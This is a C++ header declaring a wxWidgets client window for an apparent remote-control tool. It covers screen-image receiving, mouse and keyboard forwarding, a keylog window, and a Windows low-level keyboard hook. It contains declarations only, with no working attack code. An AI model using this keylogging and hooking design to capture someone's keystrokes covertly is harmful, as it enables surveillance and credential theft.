#pragma once

#include "ClientNetwork.hpp"
#include <wx/wx.h>
#include <wx/mstream.h>
#include <wx/overlay.h>

wxDECLARE_EVENT(wxEVT_CLIENT_CONNECTED, wxCommandEvent);
wxDECLARE_EVENT(wxEVT_CLIENT_DISCONNECTED, wxCommandEvent);
#define DEV

class ClientWindow : public net::IClient<RemoteMessage>, public wxFrame
{
public:
    ClientWindow();

    virtual ~ClientWindow();

    void ConnectToHost(std::string& host);
private:
    const int DELAY_MS = 10;
    bool CAPTURING = false;
    bool isWaitingForConnection = true;
    std::string host;


    wxPanel* CapturePanel = nullptr;
    wxPanel* MouseKeyPanel = nullptr;
    wxTextCtrl* textCtrl = nullptr;
    wxOverlay* overlay = nullptr;

    wxTimer* timer;
    wxTimer* secondTimer;
    wxScreenDC screenDC;
    wxBitmap screenshot;

    wxToolBar* toolbar;

    ClientTextWindow* clientTextWindow = nullptr;
    KeylogWindow* keylogWindow = nullptr;

    int imagesSentThisSecond = 0;

    void UpdatePanel();
    void ClearPanel();
    void OnUpdateWindow(wxTimerEvent&);
    void OnReceiveImage(net::message<RemoteMessage>& msg);
    void OnSecondTimer(wxTimerEvent& event);
    void OnMouseClick(wxMouseEvent& event);
    void OnMouseUnClick(wxMouseEvent& event);
    void OnKeyDown(wxKeyEvent& event);
    void OnKeyUp(wxKeyEvent& event);
    void OnMouseDoubleClick(wxMouseEvent& event);
    // void OnMouseMove(wxMouseEvent& event);
    // void OnMouseLeave(wxMouseEvent& event);
    // void OnMouseEnter(wxMouseEvent& event);
    void OnMouseWheel(wxMouseEvent& event);
    void OnDisconnectClick(wxCommandEvent& event);
    void OnCaptureClick(wxCommandEvent& event);
    void OnKeylogClick(wxCommandEvent& event);
    void OnHookClick(wxCommandEvent& event);
    void OnUnhookClick(wxCommandEvent& event);
    void OnClose(wxCloseEvent& event);
    void SendMetadata();

    bool checkValidKey(uint32_t keyCode);
    void RemoveKeyboardHook();
    void SetKeyboardHook();
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    static ClientWindow* instance; // Static pointer to the current instance

    static bool allowHook;

    HHOOK keyboardHook;

    friend class KeylogWindow;
    // std::unique_ptr<Logger> logger = std::make_unique<Logger>(this);
};
